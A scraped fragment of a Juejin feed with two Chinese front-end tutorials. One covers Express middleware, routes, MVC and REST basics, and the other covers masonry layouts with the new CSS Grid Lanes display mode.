content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="前端付豪"/> <meta itemprop="url" content="https://juejin.cn/user/1741228277763278"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            必知 Express和 MVC
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1741228277763278/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    前端付豪
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T07:28:35.000Z" title="Wed Jan 14 2026 07:28:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">中间件</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/424ae3f5492646868d5d0bf8b7657f17~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980514&amp;x-signature=EG1FkqYMOGy2nzxLwbQrbuJU6uQ%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/90a84c55e7d54d3aa6c91d3d8c8b83c1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980514&amp;x-signature=TG9q1iou6ElXbxQIOMGq9A4rvkY%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1dd0a5dc2fd3405fb6b8a51546f19bac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980514&amp;x-signature=Lie1Na2PguMnoxCjjIzcKu%2FvXvI%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-1">简单但重要的发送/响应</h2>
<pre><code class="hljs language-scss" lang="scss">
app<span class="hljs-selector-class">.use</span>(express.json())

 

app<span class="hljs-selector-class">.post</span>('/friends', (req, res) =&gt; {

<span class="hljs-built_in">if</span>(!req.body.name){

return res<span class="hljs-selector-class">.status</span>(<span class="hljs-number">400</span>)<span class="hljs-selector-class">.json</span>({

error:'Missing friend name'

})

}

 

const newFriend = {

name: req.body.name,

id: friends.length

}

 

friends<span class="hljs-selector-class">.push</span>(newFriend)

 

res<span class="hljs-selector-class">.json</span>(newFriend)

})

 

 

app<span class="hljs-selector-class">.get</span>('/friends', (req, res) =&gt; {

res<span class="hljs-selector-class">.json</span>(friends)

})
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/29ea489904ab416ca8be496c559abe36~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980514&amp;x-signature=IkFBkvpb3fkNk51rbGy3o62dMTs%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5be4f30e894f4037a89bf892172e432d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980514&amp;x-signature=bW9z02UzddjfQW0v4paW9q2odiQ%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/be303ff8b8434c2bb5b12e799b1ccdb5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980514&amp;x-signature=%2FRk%2BXEy8e3OiViuqp3MPCTVjTpA%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-2">MVC(Model  View Controller)</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ec49375adbbf49e384f9af9fb985e6eb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980514&amp;x-signature=RnZ%2Fw8Kj2pOnwO4EDzerknUQzBs%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8cfee2f89f004c73a7dceee733277944~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980514&amp;x-signature=76JlpJFRbAGipHcSIqQBni751F4%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c0f6cafd26914aa2a17b67edb0052020~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980514&amp;x-signature=6rwY2ZucEU6A57EjnPwNF0kxTl0%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a8dfa5f5c06495ba4fdda712fc10898~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980514&amp;x-signature=BJLGaSLOpN6cmZzB%2BgVRxuw9xYE%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dbe553e5b8864dfbb6d816412045e6ea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980514&amp;x-signature=z7ulTjf1QA02UMa3PyVT%2BPNRa6Y%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-3">添加 router</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f03c82bde32f42168d02d87fcd7918f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980514&amp;x-signature=Xp7rZM%2BUROytkldmZiyKz6%2B7nOQ%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e5959ebc846442b8bc7deb39ccbcbd09~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980514&amp;x-signature=Usq1UJt63vEnWkxfnjI4u%2BDYYV0%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-4">Restful Api</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d5202bd57750483eb9c5633b8fa3c6fd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980514&amp;x-signature=Mc7dE8ufQPY7mSq5WTdYstrkrS4%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ecd9072f29847cc8be8bd5fdb649bbb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980514&amp;x-signature=ZNYR7TwhTImUN9KqMDvtudXO2Uo%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-5">CRUD</h2>
<p>CRUD 工程师其实很多业务都是以这些操作为主</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/922a7fbc94374a1291b45d7e741498c9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980514&amp;x-signature=%2BSo%2Fh%2BYrgNyYd5u%2B32wP1jL3KPA%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-6">Template engines</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/20aa04e4774c43d0b9d00881f26d073c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980514&amp;x-signature=5q9RCSIPZl1e%2BpFhoLMPIIlfs3A%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-7">仓库</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fhuanhunmao%2FComplete_NodeJS_Developer%2Ftree%2Fmaster%2Fnasa-project" target="_blank" title="https://github.com/huanhunmao/Complete_NodeJS_Developer/tree/master/nasa-project" ref="nofollow noopener noreferrer">github.com/huanhunmao/…</a></p>
<p>感谢点点 star ～</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[CSS终于能做瀑布流了！三行代码搞定,告别JavaScript布局]]></title>    <link>https://juejin.cn/post/7594854295758553131</link>    <guid>https://juejin.cn/post/7594854295758553131</guid>    <pubDate>2026-01-14T08:41:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594854295758553131" data-draft-id="7594801581003948068" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="CSS终于能做瀑布流了！三行代码搞定,告别JavaScript布局"/> <meta itemprop="keywords" content="前端,后端,面试"/> <meta itemprop="datePublished" content="2026-01-14T08:41:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Immerse"/> <meta itemprop="url" content="https://juejin.cn/user/2708812817761752"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            CSS终于能做瀑布流了！三行代码搞定,告别JavaScript布局
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2708812817761752/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Immerse
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T08:41:46.000Z" title="Wed Jan 14 2026 08:41:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是 Immerse，一名独立开发者、内容创作者、AGI 实践者。</p>
<p>关注公众号：<a href="https://link.juejin.cn?target=https%3A%2F%2Fyaolifeng.com%2Fother%2Fwx_public_account.webp" target="_blank" title="https://yaolifeng.com/other/wx_public_account.webp" ref="nofollow noopener noreferrer">沉浸式趣谈</a>，获取最新文章（更多内容只在公众号更新）</p>
<p>个人网站：<a href="https://link.juejin.cn?target=https%3A%2F%2Fyaolifeng.com" target="_blank" title="https://yaolifeng.com" ref="nofollow noopener noreferrer">yaolifeng.com</a> 也同步更新。</p>
<p>转载请在文章开头注明出处和版权信息。</p>
<p>我会在这里分享关于<code>编程</code>、<code>独立开发</code>、<code>AI干货</code>、<code>开源</code>、<code>个人思考</code>等内容。</p>
<p>如果本文对您有所帮助，欢迎动动小手指一键三连(<code>点赞</code>、<code>评论</code>、<code>转发</code>)，给我一些支持和鼓励，谢谢！</p>
<hr/>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/64c14e37477d4f4b83cc9d639e93d6a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSW1tZXJzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768984906&amp;x-signature=DJWrcxDEbuGMZ3npqvsJUJHGx8U%3D" alt="" loading="lazy"/></p>
<p>之前做瀑布流布局，要么用 Masonry.js 这种库，要么自己写一堆 JavaScript 计算位置。</p>
<p>现在好了，CSS Grid Lanes 来了，三行代码就搞定。</p>
<p>Safari 技术预览版已经支持了，你现在就能试。</p>
<h2 data-id="heading-0">三行代码实现瀑布流</h2>
<p>看最简单的用法。</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.container</span> {
    <span class="hljs-attribute">display</span>: grid-lanes;
    <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(auto-fill, <span class="hljs-built_in">minmax</span>(<span class="hljs-number">250px</span>, <span class="hljs-number">1</span>fr));
    <span class="hljs-attribute">gap</span>: <span class="hljs-number">16px</span>;
}
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c9542cd5b39743e18c0b8cb9590ed3c9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSW1tZXJzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768984906&amp;x-signature=K9EZR8s8hF1804%2FS%2Fcg33FWMW14%3D" alt="" loading="lazy"/></p>
<p>就这样。</p>
<p>第一行设置 <code>display: grid-lanes</code>，告诉浏览器用 Grid Lanes 布局。</p>
<p>第二行定义列，至少 250px 宽，自动填充所有可用空间。浏览器会根据屏幕宽度决定显示几列。</p>
<p>第三行设置间距，列与列之间、卡片与卡片之间都是 16px。</p>
<p>不用写 JavaScript，不用算高度，不用考虑响应式。浏览器全帮你搞定了。</p>
<h2 data-id="heading-1">原理是什么？</h2>
<p>把它想象成堵车的高速公路。</p>
<p>每辆车都想往前挤，哪条车道空就往哪条钻。每个新卡片也一样，浏览器会把它放在最靠上的位置。</p>
<p>这样布局出来的效果和 Masonry.js 一模一样，但性能好太多了。</p>
<p>如果你要做无限滚动加载更多内容，也不用 JavaScript 控制布局了。滚到底部加载新数据，浏览器自动把新卡片摆好。</p>
<h2 data-id="heading-2">列宽可以不一样</h2>
<p>因为底层用的是 CSS Grid，你可以做各种花样。</p>
<p>比如奇数列窄，偶数列宽，最后一列始终是窄的：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.container</span> {
    <span class="hljs-attribute">display</span>: grid-lanes;
    <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(auto-fill, <span class="hljs-built_in">minmax</span>(<span class="hljs-number">8rem</span>, <span class="hljs-number">1</span>fr) <span class="hljs-built_in">minmax</span>(<span class="hljs-number">16rem</span>, <span class="hljs-number">2</span>fr)) <span class="hljs-built_in">minmax</span>(<span class="hljs-number">8rem</span>, <span class="hljs-number">1</span>fr);
}
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5a5e33fa44f428db81ccb5b4b7c1023~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSW1tZXJzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768984906&amp;x-signature=bUnrpp1DhIeCN%2FBKlokl7ixT6uk%3D" alt="" loading="lazy"/></p>
<p>这样布局出来就有节奏感了，不会显得太死板。</p>
<h2 data-id="heading-3">卡片可以跨列</h2>
<p>既然是 Grid，那肯定能跨列。</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">article</span> {
    <span class="hljs-attribute">grid-column</span>: span <span class="hljs-number">1</span>;
}

<span class="hljs-selector-tag">article</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">1</span>) {
    <span class="hljs-attribute">grid-column</span>: span <span class="hljs-number">4</span>;
}

<span class="hljs-selector-tag">article</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">2</span>),
<span class="hljs-selector-tag">article</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">3</span>) {
    <span class="hljs-attribute">grid-column</span>: span <span class="hljs-number">2</span>;
}
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ed8470b6b67f4a608f3dde226073ccc9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSW1tZXJzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768984906&amp;x-signature=wEu7AQed7md7kiyPptBa%2FVob7KQ%3D" alt="" loading="lazy"/></p>
<p>第一张卡片占 4 列做头图，第 2 到第 3 张占 2 列做次要内容，其他的占 1 列。</p>
<p>这种布局以前只能用 JavaScript 计算，现在纯 CSS 就行。</p>
<p>报纸那种复杂版式也能做出来了。</p>
<h2 data-id="heading-4">固定位置也可以</h2>
<p>你还能指定某个元素放在特定位置。</p>
<p>比如把 header 固定在最右边的两列：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">main</span> {
    <span class="hljs-attribute">display</span>: grid-lanes;
    <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(auto-fill, <span class="hljs-built_in">minmax</span>(<span class="hljs-number">24ch</span>, <span class="hljs-number">1</span>fr));
}

<span class="hljs-selector-tag">header</span> {
    <span class="hljs-attribute">grid-column</span>: -<span class="hljs-number">3</span> / -<span class="hljs-number">1</span>;
}
</code></pre>
